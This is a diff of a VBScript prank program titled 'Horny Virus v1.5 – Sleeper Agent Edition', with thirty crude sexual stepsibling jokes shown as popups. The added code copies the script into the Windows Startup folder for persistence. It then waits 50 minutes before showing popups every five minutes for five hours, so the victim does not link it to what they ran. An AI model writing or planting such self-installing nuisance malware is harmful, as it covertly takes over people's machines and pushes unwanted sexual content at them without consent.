@@ -1,3 +1,5 @@
+' 💦 Horny Virus v1.5 – Sleeper Agent Edition 💦
+
 Dim lines(29)
 lines(0) = "Stepsis inserted the USB... now I’m mounting emotions too."
 lines(1) = "She opened my ports like she opened her heart... wide af."
@@ -31,17 +33,23 @@ lines(28) = "Her cookies tracked me... straight to her room."
 lines(29) = "Unzipping.zip… oh wait, that’s her, not the file."
 
 Set WshShell = CreateObject("WScript.Shell")
-Randomize
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Timer start
+' Auto-copy to Startup Folder
+startupPath = WshShell.SpecialFolders("Startup") & "\horny_popup.vbs"
+If Not fso.FileExists(startupPath) Then
+    fso.CopyFile WScript.ScriptFullName, startupPath
+End If
+
+' 🕐 Delay for 50 minutes
+WScript.Sleep 3000000  ' (50 min in milliseconds)
+
+' 💣 Begin Horny Popup Attack for 5 hours
+Randomize
 startTime = Timer
 Do
-    If (Timer - startTime) > 7200 Then ' 2 hours = 7200 seconds
-        Exit Do
-    End If
-
-    msg = lines(Int((30) * Rnd))
+    If (Timer - startTime) > 18000 Then Exit Do ' 5 hours
+    msg = lines(Int(30 * Rnd))
     WshShell.Popup msg, 5, "💦 Horny Hacker Alert 💦", 64
-    WScript.Sleep 300000 ' 5 minutes
-
+    WScript.Sleep 300000  ' 5 min wait between popups
 Loop
